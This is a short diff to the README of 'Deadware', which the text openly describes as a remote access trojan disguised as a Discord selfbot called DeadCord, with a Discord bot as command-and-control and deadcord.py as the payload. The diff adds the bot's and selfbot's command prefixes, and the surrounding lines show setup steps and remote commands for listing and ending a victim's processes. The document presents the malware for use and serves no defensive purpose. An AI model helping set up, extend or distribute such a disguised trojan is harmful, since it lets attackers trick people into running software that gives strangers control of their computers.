@@ -1,5 +1,5 @@
 # Deadware
-Deadware is a RAT disguised as a Selfbot. It uses a Discord server and bot as a C&C while the `deadcord.py` being the payload.
+Deadware is a RAT disguised as a Selfbot. It uses a Discord server and bot as a C&C while the `deadcord.py` being the payload. The command prefix for the bot is `d!` and for the selfbot it is `.`
 
 ## How to setup
 1. Create a Discord Bot in the [Discord developer portal](https://discord.com/developers/applications)
@@ -21,6 +21,7 @@ As mentioned, Deadware is disguised as a selfbot called `DeadCord` which is a fu
 * end_task <task> - ends a task
 * get_tasks - gets current processes running
 
+ 
 
 
 
